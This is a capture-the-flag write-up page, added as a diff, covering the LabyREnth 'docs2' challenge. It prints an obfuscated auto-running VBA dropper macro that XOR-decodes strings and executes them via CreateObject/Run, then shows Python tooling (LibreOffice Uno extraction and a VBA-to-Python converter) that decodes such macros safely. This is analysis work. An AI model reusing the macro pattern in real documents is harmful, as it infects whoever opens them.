@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+
+  <title>
+    
+       &middot; Rot26
+    
+  </title>
+
+  
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Abril+Fatface" />
+
+  <!-- Icons -->
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/favicon.png" />
+<link rel="shortcut icon" href="/favicon.ico" />
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" />
+
+  <!-- Additional head bits without overriding original head -->
+</head>
+
+
+  <body class="page">
+
+    <div id="sidebar">
+  <header>
+    <div class="site-title">
+      <a href="/">
+        
+          <span class="back-arrow icon"><svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+  <path d="M0 0h24v24H0z" fill="none"/>
+  <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+</svg></span>
+        
+        Rot26
+      </a>
+    </div>
+    <p class="lead"></p>
+  </header>
+  <nav id="sidebar-nav-links">
+  
+  
+
+  
+
+  
+
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  
+
+
+  
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/BreizhCTF.html">BreizhCTF</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/Hacklu.html">Hacklu</a>
+    
+  
+
+  
+    
+      <a class="category-link "
+          href="/category/LabyREnth.html">LabyREnth</a>
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+
+  <h1>Members</h1>
+<a href="https://twitter.com/Memoi2001">Fooker</a>
+<a href="https://twitter.com/kalimer0x00">Kalimer0x00</a>
+<a href="https://twitter.com/govlog">Govlog</a>
+<a href="https://twitter.com/maxencedun">Sp4rKy</a>
+
+
+</nav>
+
+
+  
+
+  <nav id="sidebar-icon-links">
+  
+
+  <a id="subscribe-link"
+     class="icon" title="Subscribe" aria-label="Subscribe"
+     href="/feed.xml">
+    <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <circle cx="6.18" cy="17.82" r="2.18"/>
+    <path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/>
+</svg>
+  </a>
+
+  
+  
+  
+  
+
+  
+
+  
+
+  <!-- Optional additional links to insert for icons links -->
+</nav>
+  
+</div>
+
+    <main class="container">
+      <div class="content">
+  <p>What a nice challenge !</p>
+
+<p>In this docs2 challenge, you get 1337 doc files. Once again, you’re asked to enable macro.</p>
+
+<h1 id="1-macro-per-day-is-okay-">1 Macro per day is okay …</h1>
+
+<p>So, let’s look to some macroses in some random files, they all look like :</p>
+
+<pre><code class="language-vbnet">Private Sub Document_Open()
+If ActiveDocument.Variables("zJTxqS").Value &lt;&gt; "wadoz" Then
+GJmLhJxtSqFSSGx
+ActiveDocument.Variables("zJTxqS").Value = "wadoz"
+If ActiveDocument.ReadOnly = False Then
+ActiveDocument.Save
+End If
+End If
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO FfwMwxA.bas
+in file: pkg/lab_1_file.doc - OLE stream: u'Macros/VBA/FfwMwxA'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Private Function sUPofBHPpg(BJcRgNedRY As Variant, SSUsYPSWRa As Integer)
+Dim PkQzVmeRsW, vNyQDXSsCa As String, hrBvomJTpj, bbSHicjpnn
+vNyQDXSsCa = ActiveDocument.Variables("zJTxqS").Value()
+PkQzVmeRsW = ""
+hrBvomJTpj = 1
+While hrBvomJTpj &lt; UBound(BJcRgNedRY) + 2
+bbSHicjpnn = hrBvomJTpj Mod Len(vNyQDXSsCa): If bbSHicjpnn = 0 Then bbSHicjpnn = Len(vNyQDXSsCa)
+PkQzVmeRsW = PkQzVmeRsW + Chr(Asc(Mid(vNyQDXSsCa, bbSHicjpnn + SSUsYPSWRa, 1)) Xor CInt(BJcRgNedRY(hrBvomJTpj - 1)))
+hrBvomJTpj = hrBvomJTpj + 1
+Wend
+sUPofBHPpg = PkQzVmeRsW
+End Function
+Public Function GJmLhJxtSqFSSGx()
+mXHYDYcv = sUPofBHPpg(Array(27, 30, 5, 1, 8, 11, 13, 92, 10, 29, 25, 85, 34, 17, 32, 16, 12, 46, 6, 15, 22, _
+34, 73, 124, 45, 1, 23, 35, 13, 21, 40, 0, 7, 17, 72, 42, 45, 16, 18), 561)
+BEChyIOD = sUPofBHPpg(Array(33, 27, 59, 57, 23, 123, 57, 36, 40, 53, 21, 72, 32, 25, 38, 35, 25, 26, 119, 20, 41, _
+118, 15, 23, 49, 16, 119, 114, 114, 122, 36, 15, 18, 9, 22, 66, 117, 120, 0, 14, 57, _
+0, 56, 41, 22, 54, 77, 24, 109, 36, 112, 43, 51, 35, 43, 37, 15, 37, 27, 22, 117, _
+1, 56, 27, 37, 119, 112, 36, 9, 26, 42, 117, 27, 8, 1, 28, 57, 11, 7, 6, 48, _
+59, 15, 20, 121, 48, 76, 34, 25, 84, 32, 15, 14, 4, 10, 54, 12, 54, 2, 52, 14, _
+4, 37, 45, 43, 53, 37, 16, 13, 33, 14, 119, 18, 27, 56, 0, 4, 14, 42, 4, 38, _
+47, 22, 55, 36, 23, 98, 0, 54, 62, 5, 22, 23, 21, 36, 13, 48, 114, 40, 2, 36, _
+5, 119, 50, 16, 22, 112, 10, 49, 117, 51, 45, 59, 23, 3, 48, 24, 41, 22, 18, 58, _
+44, 56, 85, 46, 112, 11, 3, 28, 48, 21, 0, 46, 113, 119, 43, 40, 100, 16, 46, 39, _
+36, 124, 47, 29, 37, 15, 15, 40, 0, 15, 47, 16, 39, 118, 87, 8, 43, 97, 55, 49, _
+48, 27, 49, 19, 112, 34, 19, 63, 56, 47, 52, 12, 2, 13, 115, 44, 53, 55, 31, 8, _
+15, 114, 41, 43, 42, 38, 3, 39, 16), 13)
+vXdDrhSV = sUPofBHPpg(Array(42, 23, 113, 4, 15, 2, 2, 34, 10, 11, 13, 30, 14, 9, 56, 0, 32, 119, 36, 120, 45, _
+15, 57, 44, 3, 121, 33, 57, 40, 94, 39, 15, 42, 20, 124, 114, 46, 51, 114, 50, 61, _
+52, 33, 20, 19, 47, 39, 2, 57, 53, 34, 52, 44, 38, 23, 49, 11, 116, 120, 45, 116, _
+87, 51, 115, 49, 46, 3, 45, 113, 53, 50, 33, 9, 47, 34, 45, 51, 16, 46, 112, 113, _
+46, 11, 37, 4, 51, 35, 12, 59, 6, 25, 121, 21, 107, 48, 10, 36, 34, 21, 27, 50, _
+13, 22, 122, 73, 37, 122, 6, 41, 2, 53, 53, 120, 23, 44, 50, 52, 124, 121, 15, 57, _
+23, 60, 6, 14, 62, 7, 119, 0, 50, 120, 41, 112, 86, 116, 51, 50, 20, 28, 22, 113, _
+51, 114, 115, 49, 51, 19, 116, 0, 49, 2, 48, 8, 44, 58, 19, 112, 16, 32, 119, 42, _
+47, 17, 15, 3, 119, 50, 19, 52, 55, 124, 53, 118, 23, 49, 117, 9, 3, 39, 15, 37, _
+15, 27, 123, 2, 119, 57, 8, 116, 12, 34, 15, 37, 23, 47, 55, 26, 1, 51, 116, 57, _
+27, 11, 18, 15, 116, 56, 32, 28, 49, 120, 49, 45, 14, 19, 49, 60, 5, 30, 42, 18, _
+127, 39, 32, 39, 120, 33, 0, 10, 76), 331)
+KWYNkLDy = sUPofBHPpg(Array(117, 117, 24, 40, 31, 117, 9, 17, 6, 24, 29, 117, 9, 51, 27, 105, 49, 38, 12, 120, 26, _
+15, 34, 7, 44, 20, 124, 20, 15, 4, 12, 29, 25, 118, 3, 43, 117, 50, 119, 125, 114, _
+60, 23, 50, 90, 40, 9, 22, 36, 57, 7, 46, 98, 11, 53, 21, 22, 60, 8, 11, 10, _
+22, 46, 18, 56, 46, 18, 46, 59, 32, 115, 26, 51, 30, 105, 27, 37, 11, 123, 96, 22, _
+46, 41, 2, 49, 34, 50, 121), 243)
+VgafpjZU = mXHYDYcv + BEChyIOD + vXdDrhSV + KWYNkLDy
+VBodWvPv = sUPofBHPpg(Array(99, 61, 107, 29, 44, 3, 60, 127), 600)
+Dim Obj As Object
+Set Obj = CreateObject(sUPofBHPpg(Array(5, 101, 47, 34, 28, 69, 76, 66, 106, 39, 49, 11, 59), 0))
+Obj.Run VgafpjZU, 1
+End Function
+</code></pre>
+
+<p>What we have here :</p>
+
+<ul>
+  <li>a variable with random name (<code class="highlighter-rouge">zJTxqS</code> here) which is used in the macro itself</li>
+  <li>a private function which does some xor stuff</li>
+  <li>a public function which call the private “crypto” func many times and, at the end, does a “CreateObject” and run it</li>
+</ul>
+
+<p>This is basically the same kind of macro than docs1, easy enough to understand. The only issue … you have 1337 of them.</p>
+
+<h1 id="-but-three-macroses-brings-problem">… but three macroses brings problem</h1>
+
+<p>No way, I won’t parse the 1337 ones by hand. What I decided to do is write some script to:</p>
+
+<ul>
+  <li>extract the macro</li>
+  <li>find variable name and extract the var</li>
+  <li>store the macro with it’s variable in some file.</li>
+</ul>
+
+<p>for each document !</p>
+
+<h2 id="uno-to-the-rescue">Uno to the rescue</h2>
+
+<p><a href="https://api.libreoffice.org/">Uno</a> is the name of LibreOffice API. Yes, there is an api, and yes, your LibreOffice can listen on some socket !</p>
+
+<p>So first thing first , run libreoffice so that it listens on some socket:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>soffice <span class="nt">--headless</span> <span class="nt">--invisible</span> <span class="nt">--accept</span><span class="o">=</span><span class="s2">"socket,host=localhost,port=2002;urp;StarOffice.ServiceManager"</span>
+</code></pre></div></div>
+
+<p>Then, start python code. The code to contact the API is not really … straightforward to understand, and is taken from various websites. Here it is :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">retVal</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">doc</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">stdout</span> <span class="o">=</span> <span class="bp">False</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">stdout</span> <span class="o">=</span> <span class="bp">True</span>
+
+        <span class="n">ctxLocal</span> <span class="o">=</span> <span class="n">uno</span><span class="o">.</span><span class="n">getComponentContext</span><span class="p">()</span>
+        <span class="n">smgrLocal</span> <span class="o">=</span> <span class="n">ctxLocal</span><span class="o">.</span><span class="n">ServiceManager</span>
+
+        <span class="n">resolver</span> <span class="o">=</span> <span class="n">smgrLocal</span><span class="o">.</span><span class="n">createInstanceWithContext</span><span class="p">(</span>
+                 <span class="s">"com.sun.star.bridge.UnoUrlResolver"</span><span class="p">,</span> <span class="n">ctxLocal</span> <span class="p">)</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="s">"uno:socket,host=localhost,port=2002;urp;StarOffice.ComponentContext"</span>
+        <span class="n">ctx</span> <span class="o">=</span> <span class="n">resolver</span><span class="o">.</span><span class="n">resolve</span><span class="p">(</span> <span class="n">url</span> <span class="p">)</span>
+        <span class="n">smgr</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="n">ServiceManager</span>
+        <span class="n">msp</span> <span class="o">=</span> <span class="n">ctx</span><span class="o">.</span><span class="n">getValueByName</span><span class="p">(</span><span class="s">"/singletons/com.sun.star.script.provider.theMasterScriptProviderFactory"</span><span class="p">)</span>
+        <span class="n">sp</span> <span class="o">=</span> <span class="n">msp</span><span class="o">.</span><span class="n">createScriptProvider</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+
+        <span class="n">desktop</span> <span class="o">=</span> <span class="n">smgr</span><span class="o">.</span><span class="n">createInstanceWithContext</span><span class="p">(</span><span class="s">"com.sun.star.frame.Desktop"</span><span class="p">,</span> <span class="n">ctx</span> <span class="p">)</span>
+
+        <span class="n">cwd</span> <span class="o">=</span> <span class="n">systemPathToFileUrl</span><span class="p">(</span> <span class="n">getcwd</span><span class="p">()</span> <span class="p">)</span>
+
+        <span class="n">inProps</span> <span class="o">=</span> <span class="n">PropertyValue</span><span class="p">(</span> <span class="s">"Hidden"</span> <span class="p">,</span> <span class="mi">0</span> <span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="mi">0</span> <span class="p">),</span>
+</code></pre></div></div>
+
+<p>I’m not sure if these in/outProps are really needed, but it worked that way.</p>
+
+<p>At this point, we have only opened a connection to our soffice instance. Then we open each document :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">wrong</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1338</span><span class="p">):</span>
+            <span class="n">path</span> <span class="o">=</span> <span class="s">"lab_</span><span class="si">%</span><span class="s">s_file.doc"</span> <span class="o">%</span> <span class="n">index</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">fileUrl</span> <span class="o">=</span> <span class="n">absolutize</span><span class="p">(</span> <span class="n">cwd</span><span class="p">,</span> <span class="n">systemPathToFileUrl</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="p">)</span>
+                <span class="n">doc</span> <span class="o">=</span> <span class="n">desktop</span><span class="o">.</span><span class="n">loadComponentFromURL</span><span class="p">(</span> <span class="n">fileUrl</span> <span class="p">,</span> <span class="s">"_blank"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inProps</span> <span class="p">)</span>
+</code></pre></div></div>
+
+<p>Nothing too magic here, just create full file path, and ask my instance to open it.</p>
+
+<h3 id="parse-document">Parse document</h3>
+
+<p>So, now the document is opened, we need to:</p>
+
+<ul>
+  <li>Get the macro name. For this we get all macroses and remove the default ones</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="c"># Find macro name</span>
+               	<span class="n">macro_name</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">doc</span><span class="o">.</span><span class="n">BasicLibraries</span><span class="o">.</span><span class="n">getByName</span><span class="p">(</span><span class="s">'Project'</span><span class="p">)</span><span class="o">.</span><span class="n">getElementNames</span><span class="p">())</span>
+                <span class="n">macro_name</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'ThisDocument'</span><span class="p">)</span>
+                <span class="k">if</span> <span class="s">'Module1'</span> <span class="ow">in</span> <span class="n">macro_name</span><span class="p">:</span>
+                    <span class="n">macro_name</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'Module1'</span><span class="p">)</span>
+                <span class="c">#print(macro_name)</span>
+                <span class="k">assert</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">macro_name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
+                <span class="n">macro_name</span> <span class="o">=</span> <span class="n">macro_name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                <span class="c"># print("Doc[%s] : Found macro name %s, fetch it" % (index, macro_name))</span>
+
+                <span class="c"># Get macro</span>
+                <span class="n">macro_code</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">BasicLibraries</span><span class="o">.</span><span class="n">getByName</span><span class="p">(</span><span class="s">'Project'</span><span class="p">)</span><span class="o">.</span><span class="n">getByName</span><span class="p">(</span><span class="n">macro_name</span><span class="p">)</span>
+                <span class="k">assert</span><span class="p">(</span><span class="s">"ActiveDocument.Variables"</span> <span class="ow">in</span> <span class="n">macro_code</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Get the variable with random name used in macro</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="c"># Get User defined variable</span>
+                <span class="n">property_name</span> <span class="o">=</span> <span class="p">[</span> <span class="n">l</span> <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">macro_code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="k">if</span> <span class="s">"ActiveDocument.Variables"</span> <span class="ow">in</span> <span class="n">l</span> <span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'"'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+                <span class="k">assert</span><span class="p">(</span><span class="n">property_name</span> <span class="o">!=</span> <span class="s">''</span><span class="p">)</span>
+                <span class="n">property_value</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">getDocumentProperties</span><span class="p">()</span><span class="o">.</span><span class="n">getUserDefinedProperties</span><span class="p">()</span><span class="o">.</span><span class="n">getPropertyValue</span><span class="p">(</span><span class="n">property_name</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>replace the macro variable with its value in vba</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="n">macro_code</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">"Active.*$"</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">MULTILINE</span><span class="p">),</span> <span class="s">'"</span><span class="si">%</span><span class="s">s"'</span> <span class="o">%</span> <span class="n">property_value</span><span class="p">,</span> <span class="n">macro_code</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>and save the macro in some file:
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>             <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/tmp/</span><span class="si">%</span><span class="s">s.macro.vba'</span> <span class="o">%</span> <span class="n">index</span><span class="p">,</span><span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">output</span><span class="p">:</span>
+                 <span class="n">output</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">macro_code</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Nice. Now we have 1337 vba, but no idea how to exec it :/ I can’t find a way to push and exec a macro in soffice through Uno.</p>
+
+<p>So, once again, python to the rescue !</p>
+
+<h2 id="and-now-it-goes-insane">And now it goes insane</h2>
+
+<p>So, in docs1, I converted the vba macro to python … by hand. No, I won’t do it by hand for 1337 files, so let’s script it.
+This is basically a find &amp; replace function so that this dirty vba becomes some nice python :</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">vba2py</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="s">""" Convert the VBA macro to py
+    """</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">indent</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">inArray</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">cur_func</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">first_func</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">first_func_count</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">last_func</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">payload</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">l</span><span class="p">:</span>
+            <span class="k">continue</span>
+
+        <span class="c"># Line without interest</span>
+        <span class="k">if</span> <span class="s">'Option'</span> <span class="ow">in</span> <span class="n">l</span> <span class="ow">or</span> <span class="s">'Rem Attribute'</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="k">continue</span>
+
+        <span class="c"># Variable definition</span>
+        <span class="k">if</span> <span class="s">'Dim '</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'Dim '</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">sub_l</span> <span class="ow">in</span> <span class="n">l</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">):</span>
+                <span class="n">sub_l</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">' As [^ ]+'</span><span class="p">,</span><span class="s">''</span><span class="p">,</span><span class="n">sub_l</span><span class="p">)</span>
+                <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">s = None'</span> <span class="o">%</span> <span class="p">(</span><span class="s">'    '</span> <span class="o">*</span> <span class="n">indent</span><span class="p">,</span> <span class="n">sub_l</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()))</span>
+            <span class="k">continue</span>
+
+        <span class="k">if</span> <span class="s">"CInt"</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">'CInt</span><span class="err">\</span><span class="s">(([^</span><span class="err">\</span><span class="s">)]+)</span><span class="err">\</span><span class="s">(([^</span><span class="err">\</span><span class="s">)]+)</span><span class="err">\</span><span class="s">)'</span><span class="p">,</span><span class="s">r'int(\1[\2]'</span><span class="p">,</span><span class="n">l</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="s">'Obj.Run'</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="s">"print(</span><span class="si">%</span><span class="s">s)"</span> <span class="o">%</span> <span class="n">l</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">','</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
+            <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">s</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="p">(</span><span class="s">'    '</span> <span class="o">*</span> <span class="n">indent</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()))</span>
+            <span class="k">continue</span>
+
+        <span class="c"># if Ubound, replace by len(x) - 1</span>
+        <span class="k">if</span> <span class="s">'UBound'</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r'UBound\(([^\)]+)\)'</span><span class="p">,</span><span class="s">r'len(\1) - 1 '</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
+
+        <span class="c"># Function definition</span>
+        <span class="k">if</span> <span class="s">'Private Function'</span> <span class="ow">in</span> <span class="n">l</span> <span class="ow">or</span> <span class="s">'Public Function'</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">indent</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">'(Private|Public) Function '</span><span class="p">,</span> <span class="s">'def '</span><span class="p">,</span><span class="n">l</span><span class="p">)</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">' As [a-zA-Z]+'</span><span class="p">,</span><span class="s">''</span><span class="p">,</span><span class="n">l</span><span class="p">)</span>
+            <span class="n">cur_func</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'('</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="k">if</span> <span class="n">first_func</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="n">first_func</span> <span class="o">=</span> <span class="n">cur_func</span>
+            <span class="n">last_func</span> <span class="o">=</span> <span class="n">cur_func</span>
+            <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">lstrip</span><span class="p">()</span> <span class="o">+</span> <span class="s">':'</span><span class="p">)</span>
+            <span class="k">continue</span>
+
+        <span class="c"># End of function / Loop, just de-indent of 1 level</span>
+        <span class="k">if</span> <span class="s">'End Function'</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">cur_func</span> <span class="o">=</span> <span class="bp">None</span>
+            <span class="n">indent</span> <span class="o">-=</span> <span class="mi">1</span>
+            <span class="k">continue</span>
+
+        <span class="k">if</span> <span class="s">'Wend'</span> <span class="o">==</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">indent</span> <span class="o">-=</span> <span class="mi">1</span>
+            <span class="k">continue</span>
+
+        <span class="k">if</span> <span class="n">cur_func</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">cur_func</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">s = "</span> <span class="o">%</span> <span class="n">cur_func</span><span class="p">,</span> <span class="s">"return "</span><span class="p">)</span>
+
+        <span class="c"># Ensure we don't indent more than once</span>
+        <span class="n">toIndent</span> <span class="o">=</span> <span class="bp">False</span>
+
+		<span class="c"># Simple replace</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'Set Obj = '</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'CreateObject'</span><span class="p">,</span><span class="s">'print'</span><span class="p">)</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'Mod'</span><span class="p">,</span><span class="s">'</span><span class="si">%</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">' Xor '</span><span class="p">,</span><span class="s">' ^ '</span><span class="p">)</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'Chr'</span><span class="p">,</span><span class="s">'chr'</span><span class="p">)</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'Asc'</span><span class="p">,</span><span class="s">'ord'</span><span class="p">)</span>
+        <span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'Len'</span><span class="p">,</span><span class="s">'len'</span><span class="p">)</span>
+
+		<span class="c"># Manage single line if</span>
+        <span class="k">if</span> <span class="s">': If '</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">lleft</span><span class="p">,</span><span class="n">lright</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">' If '</span><span class="p">)</span>
